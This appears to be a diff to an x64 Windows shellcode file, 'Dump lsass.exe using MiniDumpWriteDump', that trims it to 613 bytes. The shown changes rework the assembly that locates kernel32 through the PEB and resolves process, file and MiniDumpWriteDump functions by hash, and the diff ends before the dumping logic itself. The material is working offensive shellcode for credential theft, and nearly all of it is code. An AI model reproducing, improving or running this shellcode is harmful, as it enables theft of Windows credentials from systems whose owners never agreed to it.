@@ -1,4 +1,4 @@
-# Shellcode Title: Windows/x64 Dump lsass.exe using MiniDumpWriteDump (618 bytes)
+# Shellcode Title: Windows/x64 Dump lsass.exe using MiniDumpWriteDump (613 bytes)
 # Author: Lasse H. Jensen (0xFenrik)
 # Date: 9/9/2021
 # Tested on: Windows 10 v19042 (x64), Windows Server 2016 (x64)
@@ -13,37 +13,23 @@ import ctypes, struct
 from keystone import *
 
 CODE = (
-"   start:                              "
-"       mov rbp, rsp                    ;"
-"       xor rax, rax                    ;"
-"       mov eax, 0xfffffcff             ;"
-"       inc eax                         ;"
+"   setup:                              "
+"       mov rbp, rsp                    ;" # Save rsp
+"       xor rax, rax                    ;" 
+"       mov eax, 0xfffffcff             ;" # Move rsp 0x300 bytes to make room for variables and structures
+"       inc eax                         ;" 
 "       neg eax                         ;"
 "       sub rsp, rax                    ;"
 
-"   find_kernel32:                      "
+"   kernel32_baseadddress:               "
 "       xor rcx, rcx                    ;"
 "       mov rsi, gs:[rcx+0x60]          ;" # RSI = _PEB
 "       mov rsi, [rsi+0x18]             ;" # RSI = PEB->Ldr
 "       mov rsi, [rsi+0x30]             ;" # RSI = PEB->Ldr.InInitOrder
-
-"   next_module:                        "
+"       mov rsi, [rsi]                  ;" # RSI = InInitOrder[X].flink (next) (ntdll.dll)
+"       mov rsi, [rsi]                  ;" # RSI = InInitOrder[X].flink (next) (kernel32.dll)
 "       mov r12, [rsi+0x10]             ;" # r12 = InInitOrder[X].base_address
-"       mov rdi, [rsi+0x40]             ;" # RDI = InInitOrder[X].module_address
-"       mov rsi, [rsi]                  ;" # RSI = InInitOrder[X].flink (next)
-"       cmp [rdi+12*2], cx              ;" # (unicode) modulename[12] == 0x00?
-"       jne next_module                 ;" # No: try next module.
-
-"   find_function_shorten:              "
-"       jmp find_function_shorten_bnc   ;" # short jmp
-
-"   find_function_ret:                  "
-"       pop rsi                         ;"  # POP the return address from the stack 
-"       mov [rbp+0x8], rsi              ;"  # Save find_function address for later usage
-"       jmp resolve_symbols_kernel32    ;"
-
-"   find_function_shorten_bnc:          "
-"       call find_function_ret          ;" # Rleative CALL with negative offset (we are jumping backwards)
+"       jmp resolve_symbols_kernel32    ;" # Start resolving symbol names from kernel32.dll
 
 "   find_function:                      "
 "       pop r14                         ;" # Return address to continue resolve_symbols_kernel32
@@ -64,25 +50,23 @@ CODE = (
 "   find_function_loop:                 "
 "       jecxz find_function_finished    ;" # Jump to the end if ECX is 0
 "       dec ecx                         ;" # Decrement our names counter
-"       mov esi, [r8+rcx*4]             ;" # Get the RVA of the symbol name NULL BYTE
+"       mov esi, [r8+rcx*4]             ;" # Get the RVA of the symbol name
 "       add rsi, r12                    ;" # Set RSI to the VMA of the current symbol name
 
-"   compute_hash:                       "
+"   prepare_hashing_algorithm:           "
 "       xor rax, rax                    ;" # Null the RAX register
 "       cdq                             ;" # Set EDX to the value of EAX (null)
 "       cld                             ;" # Clear the direction flag (DF)
 
-"   compute_hash_again:                 "
+"   compute_hash:                        "
 "       lodsb                           ;"  # Load the next byte from esi into al
 "       test al, al                     ;"  # Check for NULL terminator
-"       jz compute_hash_finished        ;"  # IF the ZF is set, we've hit the null
+"       jz find_function_compare        ;"  # IF the ZF is set, we've hit the null
 "       ror edx, 0x0d                   ;"  # Rotate edx 13 bits to the right
 "       add edx, eax                    ;"  # add the new byte to the accumulator (EDX)
-"       jmp compute_hash_again          ;"  # Next iteration
+"       jmp compute_hash                ;"  # Next iteration
 
-"   compute_hash_finished:              "
-
-"   find_function_compare:              "
+"   find_function_compare:               "
 "       cmp edx, r15d                   ;"  # Compare the computed hash with the requested hash
 "       jnz find_function_loop          ;"  # If it doesn't match go back to find_function_loop
 "       mov edx, [rdi+0x24]             ;"  # AddressOfNamesOrdinals RVA
@@ -94,30 +78,30 @@ CODE = (
 "       add rax, r12                    ;"  # The function VMA
 
 "   find_function_finished:             "
-"       push r14                        ;" # return correctly resolve_symbols function
+"       push r14                        ;" # return correctly to callee
 "       ret                             ;"
 
 "   resolve_symbols_kernel32:           "
-"       mov r15d, 0x73e2d87e            ;"  # ExitProcess hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x10], rax             ;"  # Save ExitProcess address for later usage
-"       mov r15d, 0xec0e4e8e            ;"  # LoadLibraryA hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x18], rax             ;"  # Save LoadLibrary address for later usage
-"       mov r15d, 0xe454dfed            ;"  # CreateToolhelp32Snapshot hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x20], rax             ;"  # Save address for later usage
-"       mov r15d, 0x4776654a            ;"  # Process32Next hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x28], rax             ;"  # Save address for later usage
-"       mov eax, 0x83ffe85b             ;"  # Negated hash for CreateFileA due to null byte (0x7c0017a5)
-"       neg eax                         ;"  # Negate back
-"       mov r15d, eax                   ;"  # CreateFileA hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x30], rax             ;"  # Save address for later usage
-"       mov r15d, 0xefe297c0            ;"  # OpenProcess hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
-"       mov [rbp+0x38], rax             ;"  # Save address for later usage
+"       mov r15d, 0x73e2d87e            ;" # ExitProcess hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x10], rax             ;" # Save ExitProcess address for later usage
+"       mov r15d, 0xec0e4e8e            ;" # LoadLibraryA hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x18], rax             ;" # Save LoadLibrary address for later usage
+"       mov r15d, 0xe454dfed            ;" # CreateToolhelp32Snapshot hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x20], rax             ;" # Save address for later usage
+"       mov r15d, 0x4776654a            ;" # Process32Next hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x28], rax             ;" # Save address for later usage
+"       mov eax, 0x83ffe85b             ;" # Negated hash for CreateFileA due to null byte (0x7c0017a5)
+"       neg eax                         ;" # Negate back
+"       mov r15d, eax                   ;" # CreateFileA hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x30], rax             ;" # Save address for later usage
+"       mov r15d, 0xefe297c0            ;" # OpenProcess hash
+"       call find_function              ;" # Call find_function
+"       mov [rbp+0x38], rax             ;" # Save address for later usage
 
 #   HMODULE LoadLibraryA(
 #       LPCSTR lpLibFileName => RCX = Pointer to string of filename
@@ -139,7 +123,7 @@ CODE = (
 "   resolve_symbols_Dbgcore:             "
 "       mov r12, rax                    ;"  # Move the base address of Dbgcore.dll to R12
 "       mov r15d, 0x79ceb893            ;"  # MiniDumpWriteDump hash
-"       call qword ptr [rbp+0x08]       ;"  # Call find_function
+"       call find_function              ;" # Call find_function
 "       mov [rbp+0x40], rax             ;"  # Save address for later usage
 
 #   HANDLE CreateToolhelp32Snapshot(
